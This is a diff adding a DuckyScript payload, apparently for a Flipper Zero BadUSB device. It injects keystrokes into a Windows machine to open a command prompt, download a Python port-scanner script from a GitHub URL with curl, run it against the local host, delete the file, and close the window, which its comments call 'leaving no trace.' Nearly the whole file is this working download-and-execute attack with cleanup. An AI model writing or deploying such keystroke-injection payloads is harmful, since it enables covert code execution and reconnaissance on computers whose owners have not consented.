@@ -1,0 +1,26 @@
+REM Scanpy-Local-Common-python3_Windows
+REM Description: Launch scanpy.py using common ports on local machine
+REM Author: Thomas McNamee
+REM Target: Windows 7+
+
+REM Adjust file accordingly
+
+DELAY 2000
+GUI r
+ENTER
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING curl https://raw.githubusercontent.com/tcmtech98/FlipperZero/main/scanpy/scanpy.py >> PythonDownload.py
+ENTER
+DELAY 5000
+STRING python3 PythonDownload.py local common & del PythonDownload.py
+ENTER
+
+REM Auto shutdown of cmd, leaving no trace.
+REM Do NOT click out of cmd or it will kill whatever process is currently running!
+REM You can also terminate on Flipper and Windows
+DELAY 180000
+CTRL c
+ALT F4
